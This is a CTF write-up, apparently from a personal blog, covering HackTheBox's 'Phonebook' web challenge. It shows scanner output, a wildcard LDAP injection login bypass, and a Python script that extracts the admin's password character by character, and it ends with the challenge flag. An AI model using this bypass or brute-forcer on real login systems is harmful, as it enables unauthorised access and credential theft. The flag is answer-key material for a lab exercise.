---
layout: post
title: HTB — Challenge — Phonebook
date: 2023-01-20 01:00:00 -500
categories: [HackTheBox]
tags: [WEB, LDAP Injection]
---

***

<center><strong><font color="White">Who is lucky enough to be included in the phonebook?</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

### <font color="#FFA500">nuclei</font>

```
[tech-detect:bootstrap] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:strict-transport-security] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:access-control-max-age] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:referrer-policy] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:permissions-policy] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:x-content-type-options] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:clear-site-data] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:content-security-policy] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:x-frame-options] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://178.128.37.153:31252/login
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://178.128.37.153:31252/login
```

On the website we can see login form:

<img src="/assets/images/HTB/Challenges/Phonebook/1.png" width="70%">

* I tried several SQLi cheatsheets, but nothing worked.
* Then I tried searching for some hints on website, but the only one is "New (9.8.2020): You can now login using the workstation username and password! - Reese"
* SQLMap didn't succeed
* Gobuster got nothing
* Finally, I googled that it could be LDAP authentication and found [LDAP Injection Guide](https://book.hacktricks.xyz/pentesting-web/ldap-injection).


So, passing `*` as username and password worked and we managed to get further. The important thing here is that by passing `*` we matched the wildcard `*` which let us pass in.

<img src="/assets/images/HTB/Challenges/Phonebook/2.png" width="70%">

Here we can see some type of search through "phonebook".

If we enter `*`, then we can get nothing. However, if we enter, for example, `@`, we get all emails. However, there is no flag.

At this point I had no clues, so I googled some hints. So, we need to bruteforce password for "Reese" which is the user mentioned in the login page, probably admin. His password is something like `HTB{*}`, where `*` are some symbols.

To do this, we just use `Reese` as username. For the password, if we enter just `*` we will log in. However, if we enter `a*`, we will get "Authentication failed", which means that password does not start with letter `a`.

From Burp Suite we can get the http POST request:


```http
POST /login HTTP/1.1
Host: 138.68.167.82:31488
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://138.68.167.82:31488
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://138.68.167.82:31488/login
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

username=Reese&password=Password
```

And the script to guess the password:

```
import requests, string

url = "http://138.68.167.82:31488/login"
headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36"}


chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

cnt = 0
flag = "HTB{"

while True:
    if cnt == len(chars):
        print(flag + "}")
        break

    password = flag + chars[cnt] + "*}"
    print(password)

    data = {"username" : "Reese", "password" : password}
    response = requests.post(url, headers = headers, data = data)
    
    if (response.url != url + "?message=Authentication%20failed"):
        flag += chars[cnt]
        cnt = 0
    else:
        cnt += 1
```

> Flag: `HTB{d1rectory_h4xx0r_is_k00l}`